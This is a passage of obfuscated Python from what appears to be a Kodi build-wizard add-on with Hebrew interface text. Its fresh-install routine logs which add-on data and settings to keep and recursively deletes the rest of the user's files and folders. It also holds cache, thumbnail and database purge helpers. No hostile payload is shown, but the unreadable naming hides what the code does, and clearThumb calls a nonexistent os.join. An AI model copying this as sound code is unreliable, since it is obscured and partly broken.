				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4903
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'skin.anonymous.mod'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4904
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'skin.Premium.mod'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4905
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'skin.anonymous.nox'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4906
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'skin.phenomenal'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4907
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'plugin.video.metalliq'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4908
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'skin.titan'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4910
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'pvr.iptvsimple'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4911
				elif OO0OOOO0O00OO0OO0 =='sources.xml'and O00OOO000O0OO00O0 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4913
				elif OO0OOOO0O00OO0OO0 =='quicknav.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4916
				elif OO0OOOO0O00OO0OO0 =='x1101.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4917
				elif OO0OOOO0O00OO0OO0 =='b-srtym-b.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4918
				elif OO0OOOO0O00OO0OO0 =='x1102.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4919
				elif OO0OOOO0O00OO0OO0 =='b-sdrvt-b.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4920
				elif OO0OOOO0O00OO0OO0 =='x1112.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4921
				elif OO0OOOO0O00OO0OO0 =='b-tlvvyzyh-b.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4922
				elif OO0OOOO0O00OO0OO0 =='x1111.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4923
				elif OO0OOOO0O00OO0OO0 =='b-tvknyshrly-b.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4924
				elif OO0OOOO0O00OO0OO0 =='x1110.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4925
				elif OO0OOOO0O00OO0OO0 =='b-yldym-b.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4926
				elif OO0OOOO0O00OO0OO0 =='x1114.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4927
				elif OO0OOOO0O00OO0OO0 =='b-mvzyqh-b.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4928
				elif OO0OOOO0O00OO0OO0 =='mainmenu.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4929
				elif OO0OOOO0O00OO0OO0 =='skin.Premium.mod.properties'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4930
				elif OO0OOOO0O00OO0OO0 =='x1122.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4932
				elif OO0OOOO0O00OO0OO0 =='b-spvrt-b.DATA.xml'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4933
				elif OO0OOOO0O00OO0OO0 =='favourites.xml'and O00OOO000O0OO00O0 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4938
				elif OO0OOOO0O00OO0OO0 =='guisettings.xml'and O00OOO000O0OO00O0 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4940
				elif OO0OOOO0O00OO0OO0 =='profiles.xml'and O00OOO000O0OO00O0 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4941
				elif OO0OOOO0O00OO0OO0 =='advancedsettings.xml'and O00OOO000O0OO00O0 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4942
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4943
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'program.apollo'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4944
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4945
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'plugin.video.elementum'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4948
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'service.subtitles.All_Subs'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4949
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4950
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'weather.yahoo'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4951
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'plugin.video.quasar'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4952
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'program.apollo'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4953
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4954
				elif O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4955
				elif OO0OOOO0O00OO0OO0 in LOGFILES :wiz .log ("Keep Log File: %s"%OO0OOOO0O00OO0OO0 ,xbmc .LOGNOTICE )#line:4956
				elif OO0OOOO0O00OO0OO0 .endswith ('.db'):#line:4957
					try :#line:4958
						if OO0OOOO0O00OO0OO0 ==O00OOO0OO00OOOOO0 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OO0OOOO0O00OO0OO0 ,KODIV ),xbmc .LOGNOTICE )#line:4959
						else :os .remove (os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ))#line:4960
					except Exception as O00OO00OOO0O0O0OO :#line:4961
						if not OO0OOOO0O00OO0OO0 .startswith ('Textures13'):#line:4962
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4963
							wiz .log ("-> %s"%(str (O00OO00OOO0O0O0OO )),xbmc .LOGNOTICE )#line:4964
							wiz .purgeDb (os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ))#line:4965
				else :#line:4966
					DP .update (int (wiz .percentage (O0O0O0OOOOOO0OOO0 ,OO0OO00OO0O0O0O00 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOOO0O00OO0OO0 ),'')#line:4967
					try :os .remove (os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ))#line:4968
					except Exception as O00OO00OOO0O0O0OO :#line:4969
						wiz .log ("Error removing %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4970
						wiz .log ("-> / %s"%(str (O00OO00OOO0O0O0OO )),xbmc .LOGNOTICE )#line:4971
			if DP .iscanceled ():#line:4972
				DP .close ()#line:4973
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4974
				return False #line:4975
		for O000O0OO0O0OO0O0O ,O0OOO0OO0O0O0O0O0 ,O0OO00O00000000O0 in os .walk (O0000OO0000OO00OO ,topdown =True ):#line:4976
			O0OOO0OO0O0O0O0O0 [:]=[OO00OOO0O00OOOOO0 for OO00OOO0O00OOOOO0 in O0OOO0OO0O0O0O0O0 if OO00OOO0O00OOOOO0 not in EXCLUDES ]#line:4977
			for OO0OOOO0O00OO0OO0 in O0OOO0OO0O0O0O0O0 :#line:4978
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OOOO0O00OO0OO0 ),'')#line:4979
			  if OO0OOOO0O00OO0OO0 not in ["Database","userdata","temp","addons","addon_data"]:#line:4980
			   if not (OO0OOOO0O00OO0OO0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4981
			    if not (OO0OOOO0O00OO0OO0 =='skin.titan'and KEEPSKIN3 =='true'):#line:4983
			      if not (OO0OOOO0O00OO0OO0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4984
			       if not (OO0OOOO0O00OO0OO0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4985
			        if not (OO0OOOO0O00OO0OO0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4986
			         if not (OO0OOOO0O00OO0OO0 =='program.apollo'and KEEPINFO =='true'):#line:4987
			          if not (OO0OOOO0O00OO0OO0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4988
			           if not (OO0OOOO0O00OO0OO0 =='weather.yahoo'and KEEPWEATHER =='true'):#line:4989
			            if not (OO0OOOO0O00OO0OO0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4990
			             if not (OO0OOOO0O00OO0OO0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4991
			              if not (OO0OOOO0O00OO0OO0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4992
			               if not (OO0OOOO0O00OO0OO0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4993
			                if not (OO0OOOO0O00OO0OO0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4994
			                 if not (OO0OOOO0O00OO0OO0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4995
			                  if not (OO0OOOO0O00OO0OO0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:4996
			                   if not (OO0OOOO0O00OO0OO0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:4997
			                    if not (OO0OOOO0O00OO0OO0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4998
			                     if not (OO0OOOO0O00OO0OO0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4999
			                       if not (OO0OOOO0O00OO0OO0 =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:5001
			                           if not (OO0OOOO0O00OO0OO0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5005
			                            if not (OO0OOOO0O00OO0OO0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5006
			                             if not (OO0OOOO0O00OO0OO0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5007
			                              if not (OO0OOOO0O00OO0OO0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5008
			                               if not (OO0OOOO0O00OO0OO0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5009
			                                  shutil .rmtree (os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),ignore_errors =True ,onerror =None )#line:5011
			if DP .iscanceled ():#line:5012
				DP .close ()#line:5013
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5014
				return False #line:5015
		DP .close ()#line:5016
		wiz .clearS ('build')#line:5017
		if over ==True :#line:5018
			return True #line:5019
		elif install =='restore':#line:5020
			return True #line:5021
		elif install :#line:5022
			buildWizard (install ,'normal',over =True )#line:5023
		else :#line:5024
			if INSTALLMETHOD ==1 :OOO0O00000000O0OO =1 #line:5025
			elif INSTALLMETHOD ==2 :OOO0O00000000O0OO =0 #line:5026
			else :OOO0O00000000O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5027
			if OOO0O00000000O0OO ==1 :wiz .reloadFix ('fresh')#line:5028
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5029
	else :#line:5030
		if not install =='restore':#line:5031
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5032
			wiz .refresh ()#line:5033
def clearCache ():#line:5038
		wiz .clearCache ()#line:5039
def fixwizard ():#line:5043
		wiz .fixwizard ()#line:5044
def totalClean ():#line:5046
		wiz .clearCache ()#line:5048
		wiz .clearPackages ('total')#line:5049
		clearThumb ('total')#line:5050
		cleanfornewbuild ()#line:5051
def cleanfornewbuild ():#line:5052
		try :#line:5053
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5054
		except :#line:5055
			pass #line:5056
		try :#line:5057
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5058
		except :#line:5059
			pass #line:5060
		try :#line:5061
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5062
		except :#line:5063
			pass #line:5064
def clearThumb (type =None ):#line:5065
	OO0OO0OOO0000OO0O =wiz .latestDB ('Textures')#line:5066
	if not type ==None :OOOO000O0OOO0OOO0 =1 #line:5067
	else :OOOO000O0OOO0OOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO0OO0OOO0000OO0O ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5068
	if OOOO000O0OOO0OOO0 ==1 :#line:5069
		try :wiz .removeFile (os .join (DATABASE ,OO0OO0OOO0000OO0O ))#line:5070
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO0OO0OOO0000OO0O )#line:5071
		wiz .removeFolder (THUMBS )#line:5072
	else :wiz .log ('Clear thumbnames cancelled')#line:5074
	wiz .redoThumbs ()#line:5075
def purgeDb ():#line:5077
	O000OO0OOOO0O0OO0 =[];OOOOOOO00O0O000OO =[]#line:5078
	for OOO000OO0OO0O0O0O ,O0000OOOOOO000000 ,OO000O0O0O0OOO0OO in os .walk (HOME ):#line:5079
		for OO0O0O00O000OOO0O in fnmatch .filter (OO000O0O0O0OOO0OO ,'*.db'):#line:5080
			if OO0O0O00O000OOO0O !='Thumbs.db':#line:5081
				OO0O0OO00OOOOOOOO =os .path .join (OOO000OO0OO0O0O0O ,OO0O0O00O000OOO0O )#line:5082
				O000OO0OOOO0O0OO0 .append (OO0O0OO00OOOOOOOO )#line:5083
				OOOO0OO0OO0O00000 =OO0O0OO00OOOOOOOO .replace ('\\','/').split ('/')#line:5084
				OOOOOOO00O0O000OO .append ('(%s) %s'%(OOOO0OO0OO0O00000 [len (OOOO0OO0OO0O00000 )-2 ],OOOO0OO0OO0O00000 [len (OOOO0OO0OO0O00000 )-1 ]))#line:5085
	if KODIV >=16 :#line:5086
		O00OO0O00O0O00OOO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOOOOOO00O0O000OO )#line:5087
		if O00OO0O00O0O00OOO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5088
		elif len (O00OO0O00O0O00OOO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5089
		else :#line:5090
			for OOOO00OOO0OO00OO0 in O00OO0O00O0O00OOO :wiz .purgeDb (O000OO0OOOO0O0OO0 [OOOO00OOO0OO00OO0 ])#line:5091
	else :#line:5092
		O00OO0O00O0O00OOO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOOOOOO00O0O000OO )#line:5093
